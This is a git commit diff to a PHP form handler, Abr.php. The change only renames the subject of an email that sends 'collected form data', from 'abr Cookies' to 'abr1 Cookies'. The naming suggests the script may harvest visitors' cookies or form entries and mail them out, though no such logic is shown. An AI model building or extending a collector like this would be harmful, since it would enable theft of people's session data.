fac347e31f86337961ee8d1781d6a0dc3f64387d
Uzr44911 <ahmjtalijaan@gmail.com>
2025-08-07 12:16:41 +0500

    Update Abr.php

--- Abr.php
+++ Abr.php
@@ -44,7 +44,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'abr Cookies';
+        $mail->Subject = 'abr1 Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
